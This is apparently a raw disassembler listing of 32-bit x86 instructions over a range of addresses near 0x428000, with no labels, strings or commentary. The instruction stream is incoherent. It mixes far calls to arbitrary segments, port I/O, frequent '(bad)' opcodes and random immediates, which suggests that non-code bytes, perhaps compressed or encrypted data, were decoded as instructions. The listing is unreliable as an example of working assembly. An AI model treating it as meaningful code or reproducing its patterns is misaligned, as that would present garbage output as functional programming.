  427a2d:	inc    eax
  427a2e:	iret   
  427a2f:	and    ebp,DWORD PTR fs:[ecx-0x5f099c67]
  427a36:	outs   dx,DWORD PTR ds:[esi]
  427a37:	inc    edx
  427a38:	jae    0x427a44
  427a3a:	cmp    al,dl
  427a3c:	call   0x3ff8:0x473afed
  427a43:	rol    bh,cl
  427a45:	dec    ebp
  427a46:	mov    edi,DWORD PTR [edx+0x9]
  427a49:	cs jae 0x427ab5
  427a4c:	out    0xdc,eax
  427a4e:	cmp    bh,BYTE PTR [ecx+esi*1]
  427a51:	add    DWORD PTR [eax-0x78],ecx
  427a54:	add    edx,esp
  427a56:	adc    BYTE PTR [eax],bh
  427a58:	sbb    DWORD PTR [ebx+0xd],ebx
  427a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a5c:	std    
  427a5d:	mov    eax,DWORD PTR [edi+0x19e2d174]
  427a63:	int    0x27
  427a65:	xor    edx,ebp
  427a67:	es inc edx
  427a69:	imul   edx,DWORD PTR [edi+0x594c7170],0x1f
  427a70:	les    edi,FWORD PTR [esi+0x20]
  427a73:	mov    esi,0x8e3e9471
  427a78:	jle    0x427a00
  427a7a:	sub    eax,0xf754c3c5
  427a7f:	adc    ah,0x46
  427a82:	fdivr  st,st(5)
  427a84:	mov    al,ds:0x3f8d62e5
  427a89:	sbb    BYTE PTR [edi],0xa7
  427a8c:	mov    ds:0xd9f03735,al
  427a91:	mov    ah,ah
  427a93:	and    BYTE PTR [esi+0x3a4e1c4f],bl
  427a99:	push   cs
  427a9a:	retf   0xc44a
  427a9d:	mov    al,ds:0x872e46a1
  427aa2:	les    ebx,FWORD PTR [ebp+0x62]
  427aa5:	adc    dl,dl
  427aa7:	int    0x5b
  427aa9:	xchg   ebp,eax
  427aaa:	pop    edx
  427aab:	rcl    edx,1
  427aad:	sbb    edi,DWORD PTR [eax-0x74]
  427ab0:	fdivr  st(3),st
  427ab2:	pop    edi
  427ab3:	stc    
  427ab4:	push   esp
  427ab5:	xor    BYTE PTR [esi+0x56],dh
  427ab8:	daa    
  427ab9:	test   al,0x45
  427abb:	ret    
  427abc:	loop   0x427b3c
  427abe:	sub    ecx,DWORD PTR ss:[edx+0x41ada057]
  427ac5:	mov    BYTE PTR [eax+0x49557e86],dl
  427acb:	adc    ecx,ebx
  427acd:	xor    ebp,DWORD PTR [ebx]
  427acf:	adc    edi,DWORD PTR [ebx]
  427ad1:	push   0x9aba4c2e
  427ad6:	sub    BYTE PTR [esi-0x8],0x5a
  427ada:	sub    esi,DWORD PTR [ebp+edi*8-0x34]
  427ade:	push   0xa6302540
  427ae3:	aaa    
  427ae4:	ja     0x427aca
  427ae6:	mov    eax,ds:0xe4579efe
  427aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aec:	jl     0x427b18
  427aee:	mov    ebx,0x978932cc
  427af3:	pop    esp
  427af4:	xchg   edi,eax
  427af5:	mov    DWORD PTR [ebx-0x508c2dea],eax
  427afb:	push   es
  427afc:	ins    DWORD PTR es:[edi],dx
  427afd:	aam    0x25
  427aff:	jae    0x427b2e
  427b01:	fmul   DWORD PTR [ebx+0x32a8850a]
  427b07:	push   edi
  427b08:	jle    0x427b85
  427b0a:	xor    BYTE PTR [edx-0x41a6e6fc],ch
  427b10:	lds    eax,FWORD PTR [eax]
	...
  427b72:	add    BYTE PTR [eax],al
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	test   BYTE PTR [ecx-0x4fcc860],0xa8
  427b86:	add    DWORD PTR [eax],eax
  427b88:	add    eax,0x98000001
  427b8d:	mov    al,0xc6
  427b8f:	mul    BYTE PTR gs:0x78df46ac
  427b96:	and    al,0x4f
  427b98:	dec    edx
  427b99:	sub    DWORD PTR [eax],0x49
  427b9c:	in     eax,0xa9
  427b9e:	xor    al,0x43
  427ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ba1:	mov    al,ds:0xe6610b5d
  427ba6:	lea    edi,[edx+edx*8+0x2d22c9f2]
  427bad:	sbb    eax,0x1bf31387
  427bb2:	enter  0xf071,0x13
  427bb6:	fisttp WORD PTR [eax-0x49]
  427bba:	les    ebp,FWORD PTR [eax]
  427bbc:	jns    0x427b94
  427bbe:	jne    0x427c09
  427bc0:	out    0x89,al
  427bc2:	mov    ds:0x181a82b3,al
  427bc7:	or     BYTE PTR [esi],dh
  427bc9:	adc    ebx,ecx
  427bcb:	data16 out 0xfa,al
  427bce:	add    bl,BYTE PTR [edi-0x14]
  427bd1:	mov    ds:0x24c4652a,al
  427bd6:	sub    ah,BYTE PTR [ecx+0x43]
  427bd9:	adc    DWORD PTR [eax+0x58],ebx
  427bdc:	fdiv   st,st(1)
  427bde:	popa   
  427bdf:	xor    ch,dh
  427be1:	aas    
  427be2:	arpl   WORD PTR [ebp+0x7b16d934],si
  427be8:	push   ebp
  427be9:	and    BYTE PTR [edi+0x45],0xd7
  427bed:	mov    cl,0xd3
  427bef:	dec    eax
  427bf0:	jb     0x427bfd
  427bf2:	out    dx,al
  427bf3:	lock call 0x4e7f:0xa6bae38a
  427bfb:	mov    gs,WORD PTR ds:0xdeaa70d5
  427c01:	data16 jb 0x427c83
  427c04:	test   eax,0x1c37a32e
  427c09:	jo     0x427bd3
  427c0b:	cdq    
  427c0c:	inc    ebx
  427c0d:	loopne 0x427bcd
  427c0f:	mov    al,ds:0x6b4dff5
  427c14:	arpl   WORD PTR [edi+0x7d8518fa],dx
  427c1a:	les    dx,DWORD PTR [edi-0x65dd6ebc]
  427c21:	and    dh,bl
  427c23:	outs   dx,DWORD PTR ds:[esi]
  427c24:	mov    DWORD PTR [ebx+0x54],esi
  427c27:	adc    al,0x84
  427c29:	int3   
  427c2a:	and    DWORD PTR [esi-0x639645c5],esi
  427c30:	pop    esi
  427c31:	into   
  427c32:	mov    DWORD PTR [edi+0x11],eax
  427c35:	push   ds
  427c36:	adc    al,0xd0
  427c38:	test   edi,ebp
  427c3a:	xor    BYTE PTR [edi-0x257307ee],bh
  427c40:	sbb    eax,0xa68ae4f8
  427c45:	lea    edi,[eax-0x301d62dd]
  427c4b:	push   edi
  427c4c:	sub    ch,bh
  427c4e:	mov    dh,0x85
  427c50:	cmc    
  427c51:	xor    BYTE PTR [ecx+0x763f9431],bh
  427c57:	push   0x42ea94af
  427c5c:	fnstenv [ebx+edi*1]
  427c5f:	int3   
  427c60:	in     al,0x36
  427c62:	mov    edi,0x7e4d5f09
  427c67:	mov    ch,BYTE PTR [edi+0x76]
  427c6a:	rcr    DWORD PTR [esi],cl
  427c6c:	xor    eax,0x14840166
  427c71:	mov    edx,0x89e9a3be
  427c76:	inc    edi
  427c77:	retf   
  427c78:	jl     0x427cec
  427c7a:	mov    ds:0xf9f3604e,al
  427c7f:	push   esp
  427c80:	mov    eax,0x5c589c11
  427c85:	push   ebp
  427c86:	popf   
  427c87:	dec    ebp
  427c88:	shr    DWORD PTR [eax-0x2b],0x58
  427c8c:	popf   
  427c8d:	add    eax,0x638648
	...
  427cf2:	add    BYTE PTR [eax],al
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x2b655d44,ebx
  427d02:	adc    eax,0x1aa00dd
  427d07:	add    BYTE PTR ds:0xd6000001,al
  427d0d:	or     BYTE PTR ds:0xf3e43fd4,bl
  427d13:	lods   al,BYTE PTR ds:[esi]
  427d14:	lods   al,BYTE PTR ds:[esi]
  427d15:	dec    ecx
  427d16:	inc    edx
  427d17:	pop    edx
  427d18:	sub    ebp,DWORD PTR [edx]
  427d1a:	out    dx,al
  427d1b:	xchg   esp,eax
  427d1c:	add    BYTE PTR [eax+0x0],0xf7
  427d20:	push   edi
  427d21:	xlat   BYTE PTR ds:[ebx]
  427d22:	xchg   BYTE PTR [esi],ch
  427d24:	pop    es
  427d25:	aaa    
  427d26:	ror    BYTE PTR [ebx-0x599b4a84],0x17
  427d2d:	sbb    al,0x5c
  427d2f:	cmp    ch,BYTE PTR [eax-0x7291281a]
  427d35:	xchg   ebx,eax
  427d36:	popa   
  427d37:	add    al,BYTE PTR [eax-0x37]
  427d3a:	mov    DWORD PTR [edi-0x44],eax
  427d3d:	(bad)  
  427d3e:	pop    ss
  427d3f:	mov    bh,0x5b
  427d41:	mov    cl,0xda
  427d43:	push   0x70
  427d45:	dec    edx
  427d46:	pop    esp
  427d47:	loope  0x427cd2
  427d49:	inc    edx
  427d4a:	mov    ds:0xdfaa9ad6,eax
  427d4f:	mov    DWORD PTR [ecx],0x4d08090a
  427d55:	add    dh,BYTE PTR [eax+0x54]
  427d58:	mov    BYTE PTR [ebx],ch
  427d5a:	daa    
  427d5b:	test   eax,0xbff4fef1
  427d60:	test   BYTE PTR ds:0x1c213876,al
  427d66:	and    DWORD PTR [ebp+edx*2-0x30054b3a],ecx
  427d6d:	lock sub al,0xe0
  427d70:	push   eax
  427d71:	outs   dx,BYTE PTR ds:[esi]
  427d72:	cs (bad) 
  427d74:	jae    0x427d59
  427d76:	fistp  DWORD PTR [esi+0x64d78b26]
  427d7c:	xor    ch,BYTE PTR [ecx-0x40cc8318]
  427d82:	dec    eax
  427d83:	popf   
  427d84:	sbb    al,0x49
  427d86:	aas    
  427d87:	cdq    
  427d88:	dec    ebp
  427d8a:	gs xchg esp,eax
  427d8c:	xchg   DWORD PTR [eax+0x4e],ebp
  427d8f:	out    dx,al
  427d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d91:	add    al,0x16
  427d93:	adc    ecx,DWORD PTR [eax+0x3]
  427d96:	push   eax
  427d97:	mov    al,ds:0x7108f7c6
  427d9c:	sbb    bh,BYTE PTR [edi]
  427d9e:	and    BYTE PTR [ecx],ch
  427da0:	fidivr WORD PTR [ebx+0x23]
  427da3:	leave  
  427da4:	aaa    
  427da5:	lods   al,BYTE PTR ds:[esi]
  427da6:	clc    
  427da7:	popa   
  427da8:	ret    0x757d
  427dab:	ret    0x9861
  427dae:	addr16 mov bh,0x1b
  427db1:	mov    ah,0xf1
  427db3:	mov    dh,0x35
  427db5:	push   edx
  427db6:	cli    
  427db7:	lods   al,BYTE PTR ds:[esi]
  427db8:	or     al,0x6b
  427dba:	push   es
  427dbb:	out    dx,eax
  427dbc:	popa   
  427dbd:	sbb    eax,0xbe9ab2ec
  427dc2:	repz adc ch,BYTE PTR [eax-0x3fb08bc3]
  427dc9:	push   es
  427dca:	aaa    
  427dcb:	mov    bl,0x98
  427dcd:	test   eax,0x4fb3980
  427dd2:	push   0xa202aa54
  427dd7:	es dec eax
  427dd9:	out    dx,eax
  427dda:	inc    ecx
  427ddb:	push   ds
  427ddc:	nop
  427ddd:	adc    dl,BYTE PTR [edi]
  427ddf:	(bad)  
  427de0:	xchg   esi,eax
  427de1:	fwait
  427de2:	int    0x5
  427de4:	idiv   DWORD PTR [ebp+0x34]
  427de7:	fisttp WORD PTR [ecx-0x7d]
  427dea:	xchg   esp,eax
  427deb:	addr16 pop es
  427ded:	pop    ss
  427dee:	xchg   edi,eax
  427def:	aas    
  427df0:	lea    ebp,[edi+0x8]
  427df3:	push   0x10b16003
  427df8:	add    DWORD PTR [edx+ebx*8],ebp
  427dfb:	pushf  
  427dfc:	dec    edx
  427dfd:	push   esp
  427dfe:	xor    eax,0x9ace68fc
  427e03:	xchg   ecx,eax
  427e04:	and    al,0xa0
  427e06:	loop   0x427db0
  427e08:	mov    cl,0xf0
  427e0a:	inc    edi
  427e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e0c:	(bad)  
  427e0d:	(bad)  
  427e0e:	daa    
  427e0f:	cmp    bl,bl
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	xor    esp,ecx
  427e82:	mov    edx,0x1ab0515
  427e87:	add    BYTE PTR ds:0xe7000001,al
  427e8d:	sbb    ch,ch
  427e8f:	or     al,BYTE PTR [edx+eax*4+0x7f]
  427e93:	daa    
  427e94:	outs   dx,DWORD PTR cs:[esi]
  427e96:	dec    edx
  427e97:	mov    edi,0x4378c7a0
  427e9c:	stos   BYTE PTR es:[edi],al
  427e9d:	inc    esp
  427e9e:	add    eax,0xde8c1731
  427ea3:	pop    ebx
  427ea4:	stos   BYTE PTR es:[edi],al
  427ea5:	xlat   BYTE PTR ds:[ebx]
  427ea6:	imul   esp,DWORD PTR [edi-0x23],0xcc7434c
  427ead:	push   0x28
  427eaf:	inc    eax
  427eb0:	cmp    dl,bh
  427eb2:	ret    
  427eb3:	pop    ecx
  427eb4:	(bad)  
  427eb5:	rol    dh,0x70
  427eb8:	add    DWORD PTR [eax],0xfffffff9
  427ebb:	sbb    BYTE PTR [ebx],bl
  427ebd:	add    eax,0xb73ebd67
  427ec2:	sbb    al,0xdd
  427ec4:	in     eax,0x1a
  427ec6:	call   0x42dda58c
  427ecb:	(bad)  [ebp-0x7740f02c]
  427ed1:	loop   0x427e94
  427ed3:	dec    ecx
  427ed4:	adc    ecx,ecx
  427ed6:	loopne 0x427ea3
  427ed8:	and    edi,edx
  427eda:	cmp    ecx,esp
  427edc:	fidivr DWORD PTR [edx+ebp*1]
  427edf:	xor    eax,DWORD PTR [edi+0x2e05e5c1]
  427ee5:	wbinvd 
  427ee7:	fs jno 0x427f66
  427eea:	sbb    DWORD PTR [eax+0x72af30ea],ecx
  427ef0:	(bad)  
  427ef1:	push   0x5afae254
  427ef6:	js     0x427f0b
  427ef8:	dec    edx
  427ef9:	out    0xbd,eax
  427efb:	adc    al,0xf5
  427efd:	retf   0x5b46
  427f00:	shl    DWORD PTR [edi-0x1a],1
  427f03:	pop    esp
  427f04:	push   ebx
  427f05:	lods   eax,DWORD PTR es:[esi]
  427f07:	xor    ecx,ebp
  427f09:	or     dl,BYTE PTR [eax-0x20]
  427f0c:	dec    esp
  427f0d:	dec    edi
  427f0e:	xor    BYTE PTR [edx+0x3821433c],dl
  427f14:	fwait
  427f15:	loope  0x427f00
  427f17:	cdq    
  427f18:	sub    DWORD PTR [esi],edx
  427f1a:	jmp    0xc4b7:0xa358216b
  427f21:	cmp    eax,0x8a659138
  427f26:	loope  0x427f91
  427f28:	cli    
  427f29:	adc    al,0x89
  427f2b:	stc    
  427f2c:	cmp    ah,ah
  427f2e:	outs   dx,DWORD PTR ds:[esi]
  427f2f:	test   al,0x5d
  427f31:	mov    cl,0xb0
  427f33:	sbb    cl,BYTE PTR [ebx]
  427f35:	fadd   st,st(0)
  427f37:	jmp    0x51f59be2
  427f3c:	mov    WORD PTR [ecx-0x619bb0f1],ds
  427f42:	gs jge 0x427ed1
  427f45:	dec    ebp
  427f46:	cli    
  427f47:	enter  0xcdab,0xf3
  427f4b:	fs mov ebx,0x95fe6c41
  427f51:	jl     0x427f07
  427f53:	pop    edi
  427f54:	pop    esp
  427f55:	je     0x427fb3
  427f57:	leave  
  427f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f59:	push   esp
  427f5a:	jae    0x427fa9
  427f5c:	loop   0x427f7d
  427f5e:	loop   0x427ef2
  427f60:	pop    edi
  427f61:	call   0xc0ad:0x3be31f6b
  427f68:	pusha  
  427f69:	adc    dl,BYTE PTR [eax-0x1e]
  427f6c:	fiadd  WORD PTR [eax+edi*2+0x6b5eac0d]
  427f73:	pop    edx
  427f74:	push   esp
  427f75:	sar    BYTE PTR [eax+0x0],1
  427f78:	sub    al,0xd2
  427f7a:	retf   0xf4a2
  427f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f7e:	outs   dx,BYTE PTR ds:[esi]
  427f7f:	jbe    0x427fd4
  427f81:	std    
  427f82:	lds    edx,FWORD PTR [ebx-0x3bb8bc9c]
  427f88:	ffreep st(5)
  427f8a:	ss pop edi
  427f8c:	dec    eax
  427f8d:	or     al,0xa4
  427f8f:	int3   
  427f90:	or     eax,DWORD PTR [eax]
	...
  427ff2:	add    BYTE PTR [eax],al
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	imul   ebx,esi,0x27
  428003:	fimul  DWORD PTR [edx]
  428005:	lods   al,BYTE PTR ds:[esi]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    eax,0x74000001
  42800d:	and    bl,BYTE PTR [ecx]
  42800f:	lea    ebp,[eax+0xd]
  428012:	mov    bl,BYTE PTR [edx-0x5dc50cb8]
  428018:	aad    0x8f
  42801a:	push   ebx
  42801b:	pop    esi
  42801c:	pop    es
  42801d:	sub    eax,DWORD PTR [ecx]
  42801f:	out    0x15,eax
  428021:	inc    ecx
  428022:	lahf   
  428023:	test   DWORD PTR [esi],esi
  428025:	xor    BYTE PTR [edx+edx*8+0x344aaefb],ch
  42802c:	add    eax,0xb34d4c1e
  428031:	call   0x7c29:0x89bfb3d5
  428038:	jns    0x428090
  42803a:	and    al,0xe3
  42803c:	je     0x428047
  42803e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42803f:	lock xchg ebx,eax
  428041:	jle    0x427fef
  428043:	cmp    edi,DWORD PTR [ebx-0x5b074d8d]
  428049:	sbb    eax,0xc4c2aa6f
  42804e:	add    eax,0xcb8a8417
  428053:	mov    ebp,0x19c0a40e
  428058:	inc    dx
  42805a:	(bad)  
  42805b:	lods   al,BYTE PTR ds:[esi]
  42805c:	gs or  dh,ch
  42805f:	or     DWORD PTR [esi+edi*4+0x6e846041],ebp
  428066:	loopne 0x428073
  428068:	(bad)  
  428069:	hlt    
  42806a:	cli    
  42806b:	fsub   QWORD PTR [edi+0x2b]
  42806e:	sub    BYTE PTR [eax],bh
  428070:	dec    esp
  428071:	imul   ebp,DWORD PTR [ebp-0x680c7181],0xbb1929b5
  42807b:	mov    dl,0x13
  42807d:	rol    DWORD PTR [edx+0x4],1
  428080:	xor    al,0x82
  428082:	jg     0x4280d0
  428084:	adc    DWORD PTR [ebx+0x5ed7aeb],esi
  42808a:	xchg   ah,cl
  42808c:	loope  0x4280f5
  42808e:	xchg   esp,eax
  42808f:	push   eax
  428090:	mov    es,edx
  428092:	mov    edi,0xebdb84f9
  428097:	scas   al,BYTE PTR es:[edi]
  428098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428099:	xchg   esi,eax
  42809a:	hlt    
  42809b:	adc    ah,BYTE PTR [esi+0x5]
  42809e:	call   0xdd63:0x5a58a1ac
  4280a5:	push   ecx
  4280a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280a7:	mov    al,0x1b
  4280a9:	mov    al,dh
  4280ab:	mov    ecx,0x613a5050
  4280b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280b1:	sbb    DWORD PTR [ecx],0xffffff9b
  4280b4:	add    ah,BYTE PTR [ecx+0x3afdfce8]
  4280ba:	(bad)  [edi-0x1cd2e71f]
  4280c0:	jge    0x428048
  4280c2:	push   cs
  4280c3:	nop
  4280c4:	repnz cmp eax,0x75bd18f6
  4280ca:	mov    ds:0x7abd8667,al
  4280cf:	addr16 int3 
  4280d1:	pop    esi
  4280d2:	div    BYTE PTR [esp+ebx*4]
  4280d5:	gs push edi
  4280d7:	iret   
  4280d8:	out    0xf3,eax
  4280da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280db:	ja     0x428098
  4280dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280de:	ret    
  4280df:	push   0xffffff97
  4280e1:	pop    edi
  4280e2:	dec    ebx
  4280e3:	mov    DWORD PTR ds:0x23e1cdfd,ebp
  4280e9:	mov    WORD PTR ds:0xe03daf2e,gs
  4280ef:	fwait
  4280f0:	pop    edx
  4280f1:	test   eax,0x77ea7d9
  4280f6:	ss pop edx
  4280f8:	stc    
  4280f9:	mov    bh,0x7d
  4280fb:	pop    esi
  4280fc:	lods   al,BYTE PTR ds:[esi]
  4280fd:	mov    cl,0xe6
  4280ff:	ror    bl,cl
  428101:	imul   ecx,esi,0x44
  428104:	xlat   BYTE PTR ds:[ebx]
  428105:	mov    eax,ds:0x72a6da9
  42810a:	push   esi
  42810b:	cs mov esi,0xda5331fc
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	icebp  
  428181:	pop    ss
  428182:	dec    esi
  428183:	mov    eax,ds:0x1ad0f
  428188:	add    eax,0xbc000001
  42818d:	mov    ah,0x8f
  42818f:	mov    dh,0x16
  428191:	push   esi
  428192:	sub    bl,BYTE PTR [ebx+0x47e7f381]
  428198:	call   0x5556b206
  42819d:	(bad)  
  42819f:	stc    
  4281a0:	mov    bl,0x2c
  4281a2:	push   cs
  4281a3:	ror    ch,cl
  4281a5:	and    ecx,esp
  4281a7:	add    BYTE PTR ds:0xa1c538f5,dl
  4281ad:	imul   esp,ecx,0xdeed9bdc
  4281b3:	sub    esi,DWORD PTR [ebp-0x29]
  4281b6:	mov    ch,0xe0
  4281b8:	cmp    al,0x82
  4281ba:	sub    eax,0x799cdebe
  4281bf:	xchg   DWORD PTR [ecx],edi
  4281c1:	pop    ss
  4281c2:	mov    eax,0xb4c31899
  4281c7:	jecxz  0x428194
  4281c9:	loopne 0x42821f
  4281cb:	popa   
  4281cc:	jne    0x428185
  4281ce:	out    0x7,al
  4281d0:	stos   DWORD PTR es:[edi],eax
  4281d1:	sub    ebx,DWORD PTR [edx+0x5a1c39c]
  4281d7:	sub    dl,BYTE PTR ds:0x7d2bc5f
  4281dd:	icebp  
  4281de:	(bad)  
  4281df:	pop    ss
  4281e0:	cli    
  4281e1:	xchg   BYTE PTR [ebx+0x4c],bh
  4281e4:	rep ins BYTE PTR es:[edi],dx
  4281e6:	repnz adc ebp,DWORD PTR [ebx]
  4281e9:	test   eax,0xa5d96424
  4281ee:	mov    ah,0x46
  4281f0:	mov    al,ds:0xbc7ea95d
  4281f5:	jne    0x42817a
  4281f7:	jp     0x428205
  4281f9:	jecxz  0x428270
  4281fb:	jmp    0x428232
  4281fd:	dec    ebp
  4281fe:	cmp    DWORD PTR [ecx+0x30],eax
  428201:	ds xchg ecx,eax
  428203:	rcl    DWORD PTR ds:0xded27a66,1
  428209:	sbb    DWORD PTR [eax],ebx
  42820b:	mov    eax,ds:0x6eaf06a7
  428210:	rcl    BYTE PTR [ebp-0x978f86d],cl
  428216:	inc    edx
  428217:	shl    eax,0xa
  42821a:	lods   eax,DWORD PTR ds:[esi]
  42821b:	loopne 0x4281ec
  42821d:	xchg   ebp,eax
  42821e:	jb     0x428280
  428220:	pop    ebx
  428221:	mov    cl,0x26
  428223:	inc    ebx
  428224:	sbb    edx,0xafc80077
  42822a:	retf   0x1e4e
  42822d:	or     esi,esi
  42822f:	ins    BYTE PTR es:[edi],dx
  428230:	mov    DWORD PTR [ebp+0x44],ecx
  428233:	mov    DWORD PTR [edi+eax*1],ebx
  428236:	mov    esi,0x9af60730
  42823b:	je     0x42824b
  42823d:	mov    bl,0x9e
  42823f:	mov    al,ds:0xe699f350
  428244:	mov    ch,0x75
  428246:	aad    0x81
  428248:	(bad)  
  428249:	mov    dl,0xde
  42824b:	lods   eax,DWORD PTR ds:[esi]
  42824c:	mov    ds:0x5dc0c6c2,al
  428251:	mov    esp,0x1ca9727b
  428256:	push   eax
  428257:	push   0x20
  428259:	leave  
  42825a:	mov    gs,WORD PTR [edx+0x7a]
  42825d:	xchg   ebp,eax
  42825e:	or     DWORD PTR [ebx],esi
  428260:	cmp    al,0x3b
  428262:	mov    ah,0x99
  428264:	fcmovb st,st(4)
  428266:	shr    DWORD PTR [ecx-0x52],cl
  428269:	xchg   esp,eax
  42826a:	jg     0x428207
  42826c:	sub    bh,BYTE PTR [ebp+0x86be43d]
  428272:	cmp    dl,ch
  428274:	add    dh,BYTE PTR [eax-0x1b3ec12]
  42827a:	cmp    ch,BYTE PTR [eax+0x4ea63b6e]
  428280:	call   0x43e7:0x44a0924e
  428287:	fisubr DWORD PTR [ebp+0x1a0d35e9]
  42828d:	daa    
  42828e:	mov    BYTE PTR [edx],dh
  428290:	test   BYTE PTR [eax],al
	...
  4282f2:	add    BYTE PTR [eax],al
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428301:	sbb    eax,edx
  428303:	rcl    BYTE PTR [esi+ebp*4],cl
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x22000001
  42830d:	sub    eax,0x554a91c0
  428312:	in     eax,0xd8
  428314:	or     eax,DWORD PTR [eax]
  428316:	adc    bl,BYTE PTR [edi]
  428318:	dec    edi
  428319:	xchg   ebx,eax
  42831a:	cli    
  42831b:	pushf  
  42831c:	rol    DWORD PTR [edi+ebx*2],cl
  42831f:	pusha  
  428320:	in     eax,0xa8
  428322:	and    DWORD PTR [ebx+0x77c9d511],eax
  428328:	mov    ds,WORD PTR [eax-0x6f]
  42832b:	(bad)  
  42832c:	pushf  
  42832d:	or     cl,BYTE PTR [ebx+0x228c0ff9]
  428333:	mov    bl,0xa9
  428335:	dec    esp
  428336:	shl    BYTE PTR [eax-0x6119463d],0xe1
  42833d:	cmc    
  42833e:	adc    al,0x84
  428340:	inc    ecx
  428341:	or     al,0xc3
  428343:	xchg   ecx,eax
  428344:	mov    ecx,0x5c9a3e92
  428349:	outs   dx,DWORD PTR ds:[esi]
  42834a:	adc    DWORD PTR [ecx+0x5a],ecx
  42834d:	xor    ebx,DWORD PTR [edi+0x1f]
  428350:	adc    DWORD PTR [edi+0x7ec68cc8],0x49
  428357:	xchg   BYTE PTR ds:0x7bd25969,dh
  42835d:	xchg   ebx,eax
  42835e:	sbb    eax,0x23f8ee38
  428363:	xlat   BYTE PTR ds:[ebx]
  428364:	inc    edi
  428365:	fwait
  428366:	cwde   
  428367:	dec    esp
  428368:	pop    ebp
  428369:	pop    ss
  42836a:	mov    bh,0x28
  42836c:	jmp    0x5404:0xa9b8758e
  428373:	and    BYTE PTR [esi+edi*1+0x22],dh
  428377:	push   es
  428378:	jnp    0x428330
  42837a:	pop    ss
  42837b:	stos   DWORD PTR es:[edi],eax
  42837c:	and    BYTE PTR [edx-0x3e],cl
  42837f:	ss pop ss
  428381:	or     cl,0x94
  428384:	xor    BYTE PTR gs:[esp+eiz*2],bh
  428388:	arpl   cx,ax
  42838a:	cwde   
  42838b:	ss test al,0xa4
  42838e:	sub    edi,ebp
  428390:	ins    BYTE PTR es:[edi],dx
  428391:	test   DWORD PTR [eax-0x33c4c6de],esp
  428397:	and    edi,DWORD PTR [esi]
  428399:	cmp    BYTE PTR [ecx+0x7294680d],ch
  42839f:	rcl    DWORD PTR [edx],cl
  4283a1:	inc    edx
  4283a2:	xchg   edi,eax
  4283a3:	aad    0x37
  4283a5:	push   ebp
  4283a6:	jae    0x428334
  4283a8:	cli    
  4283a9:	fdivr  QWORD PTR [ebx]
  4283ab:	mov    ebp,0x4e842f2d
  4283b0:	dec    eax
  4283b1:	sar    DWORD PTR [edi],0xe3
  4283b4:	add    eax,0x9311738
  4283b9:	mov    esi,es
  4283bb:	leave  
  4283bc:	inc    ebp
  4283bd:	jmp    0x2560:0x20df2bdc
  4283c4:	dec    edi
  4283c5:	repnz or ebx,DWORD PTR [ecx]
  4283c8:	cmp    DWORD PTR [edi],0x2b
  4283cb:	mov    esi,ebx
  4283cd:	sub    esi,DWORD PTR [eax-0x68d82a25]
  4283d3:	pushf  
  4283d4:	mov    dl,0xfa
  4283d6:	into   
  4283d7:	mov    ch,0xf7
  4283d9:	cmc    
  4283da:	mov    edx,0xde835330
  4283df:	jle    0x428400
  4283e1:	sub    al,0x4a
  4283e3:	cmp    eax,0x35fbe510
  4283e8:	sti    
  4283e9:	adc    ah,bh
  4283eb:	daa    
  4283ec:	lea    ecx,[ebx-0x1b30491a]
  4283f2:	sub    dh,BYTE PTR [edi+0x2a0d2423]
  4283f8:	xor    eax,0x2d6c99ba
  4283fd:	xlat   BYTE PTR ds:[ebx]
  4283fe:	push   edx
  4283ff:	xlat   BYTE PTR ds:[ebx]
  428400:	add    bh,BYTE PTR [edi+0x56]
  428403:	(bad)  
  428404:	fdivp  st(2),st
  428406:	mov    esi,0xe3dc381e
  42840b:	nop
  42840c:	jp     0x4283a1
  42840e:	push   eax
  42840f:	pop    ds
  428410:	loopne 0x428412
	...
  428472:	add    BYTE PTR [eax],al
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x1dabfb32
  428481:	addr16 js 0x4284f0
  428484:	sbb    DWORD PTR [edi+0x1050001],ebp
  42848a:	add    BYTE PTR [eax],al
  42848c:	add    ebx,ebx
  42848e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  428490:	mov    gs,WORD PTR [ebx+0x41]
  428493:	ret    0xa179
  428496:	sub    eax,0x2e33a2e1
  42849b:	daa    
  42849c:	call   0xc5888fc4
  4284a1:	pop    eax
  4284a2:	pop    edx
  4284a3:	inc    esi
  4284a4:	cmp    esp,ebp
  4284a6:	sbb    cl,al
